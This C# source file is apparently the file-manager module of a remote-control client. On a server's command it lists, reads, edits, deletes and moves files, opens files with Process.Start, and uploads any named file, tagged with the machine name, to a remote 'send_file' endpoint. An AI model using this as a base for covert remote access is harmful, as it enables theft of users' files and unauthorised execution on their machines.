using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web.Script.Serialization;

namespace ClIENT_PC.Controller
{
    class FichiersController : ControllerBase
    {
        public string Fichiers(string path)
        {
            List<object> ListeDossier = new List<object> { };
            List<object> ListeFichier = new List<object> { };
            try
            {
                string[] Dossiers = System.IO.Directory.GetDirectories(path);
                string[] Fichiers = System.IO.Directory.GetFiles(path);
                // Dossier.
                foreach (string dossier in Dossiers)
                {
                    DirectoryInfo dir = new DirectoryInfo(dossier);
                    ListeDossier.Add(new { name = dir.Name });
                }
                // Fichier.
                foreach (string fichier in Fichiers)
                {
                    FileInfo fi = new FileInfo(fichier);

                    ListeFichier.Add(new
                    {
                        name = fi.Name,
                        size = fi.Length,
                        date = fi.LastAccessTimeUtc
                    });
                }
            }
            catch { }
            var serializer = new JavaScriptSerializer();
            return serializer.Serialize(new { folders = ListeDossier, files = ListeFichier });
        }

        public string Editer(string path, string step, string write_content)
        {
            if (step == "0")
            {
                string send_content = string.Empty;
                using (StreamReader streamReader = new StreamReader(path, Encoding.UTF8))
                {
                    send_content = streamReader.ReadToEnd();
                }
                return serializer.Serialize(new { success = true, message = "Conteunu du fichier", path = path, content = send_content });
            }
            else if (step == "1")
            {
                using (StreamWriter writer = new StreamWriter(path, true))
                {
                    writer.Write(write_content);
                    writer.Close();
                }
                return serializer.Serialize(new { success = true, message = "Fichier editer", path = path });
            }
            return serializer.Serialize(new { success = false, message = "Fichier non editer", path = path });
        }

        public string Action(string action, string argv2)
        {
            dynamic argvs = serializer.DeserializeObject(argv2);

            switch (action)
            {
                case "cree-fichier":
                    File.Create(argvs["path"]);
                    return serializer.Serialize(new { success = true, message = "Fichier crée avec succés" });
                    break;

                case "supprimer-fichier":
                    try
                    {
                        if (File.Exists(argvs["path"]))
                        {
                            File.Delete(argvs["path"]);
                            return serializer.Serialize(new { success = true, message = "Fichier supprimer avec succés" });
                        }
                    }
                    catch { }
                    break;

                case"supprimer-dossier":
                    try 
	                {
                        if (Directory.Exists(argvs["path"]))
                        {
                            Directory.Delete(argvs["path"]);
                            return serializer.Serialize(new { success = true, message = "Dossier supprimer avec succés" });
                        }
	                }
	                catch {}
                    break;

                case "coller":
                    try
                    {
                        File.Copy(argvs["path"], argvs["new_path"]);
                        return serializer.Serialize(new { success = true, message = "Fichier coller avec succés" });
                    }
                    catch { }
                    break;

                case "deplacer":
                    try
                    {
                        if (argvs["path"].EndsWith("/"))
                            Directory.Move(argvs["path"], argvs["new_path"]);
                        else
                            File.Move(argvs["path"], argvs["new_path"]);

                        return serializer.Serialize(new { success = true, message = "Fichier déplacer avec succés" });
                    }
                    catch { }
                    break;

                case "modifier":
                    using (StreamWriter writer = new StreamWriter(argvs["path"], true))
                    {
                        writer.Write(argvs["content"]);
                        writer.Close();
                    }
                    return serializer.Serialize(new { success = true, message = "Fichier editer avec succés" });
                    break;

                case "avoirConteunu":
                    string conteunu = string.Empty;
                    using (StreamReader streamReader = new StreamReader(argvs["path"], Encoding.UTF8))
                    {
                        conteunu = streamReader.ReadToEnd();
                    }
                    return serializer.Serialize(new { success = true, message = "Conteunu du fichier reçus avec succés", path = argvs["path"], content = conteunu });
                    break;

                case "ouvrir":
                    try 
                    {
                        if (File.Exists(argvs["path"]))
                        {
                            System.Diagnostics.Process.Start(argvs["path"]);
                            return serializer.Serialize(new { success = true, message = "Fichier ouvert avec succés" });
                        }
                        else
                        {
                            return serializer.Serialize(new { success = false, message = "Fichier à ouvrir n'existe pas" });
                        }
                    } catch {
                        return serializer.Serialize(new { success = false, message = "Erreur: Ouvrir un fichier une exception c'est produite" });
                    }
                    break;

                default:
                    break;
            }
            return string.Empty;
        }
       
        public string AvoirFichier(string path)
        {
            try
            {
                if (File.Exists(path))
                {
                    string response = hr.postFile(Router.url("send_file"), path, "file");
                    dynamic data = serializer.DeserializeObject(response);
                    return serializer.Serialize(new { action = "recusFichier", media_id = data["media_id"], path = Convert.ToString(data["path"]) });
                }
                else
                {
                    return serializer.Serialize(new { success = false, message = "Erreur: Fichier n'existe pas", path = path });
                }
            }
            catch (Exception)
            {
                return serializer.Serialize(new { success = false, message = "Erreur: Télécharger un fichier une exception c'est produite", path = path });
            }
        }

        public string GetFichier(string dir, string file_name, string media_id)
        {
            string data = string.Empty;
            try
            {
                if (Directory.Exists(dir))
                {
                    string url = Router.url("get_file") + media_id + "?token=" + Parametre.API_KEY;

                    bool ok = false;
                    int i = 1;
                    while (!ok)
                    {
                        if (File.Exists(dir + file_name))
                        {
                            file_name = Path.GetFileNameWithoutExtension(file_name) + "_" + i + Path.GetExtension(file_name);
                        }
                        else
                        {
                            break;
                        }
                        i++;
                    }

                    using (var cl = new WebClient())
                    {
                        byte[] dataFile = cl.DownloadData(url);
                        File.WriteAllBytes(dir + file_name, dataFile);
                    }
                    
                    return serializer.Serialize(new { success = true, message = "Fichier envoyer avec succés" });
                }
                else
                {
                    return serializer.Serialize(new { success = false, message = "Erreur: Le dossier n'existe pas", path = dir });
                }
            }
            catch (Exception)
            {
                return serializer.Serialize(new { success = false, message = "Erreur: Envoie de fichier une exception c'est produite", path = dir });
            }
        }
        public string TelechargerFichier(string path_file)
        {
            if (File.Exists(path_file))
            {
                FileInfo fi = new FileInfo(path_file);
                string response = hr.postFile(Router.url("send_file"), path_file, "file");
                dynamic data = serializer.DeserializeObject(response);

                return serializer.Serialize(new { success = false, message = "ok", pc_name = Environment.MachineName, media_id = Convert.ToString(data["media_id"]), file_name = fi.Name, size = fi.Length });
            }
            else
            {
                return serializer.Serialize(new { success = false, message = "Erreur: Le fichier n'existe pas", path = path_file });
            }
        }
    }
}
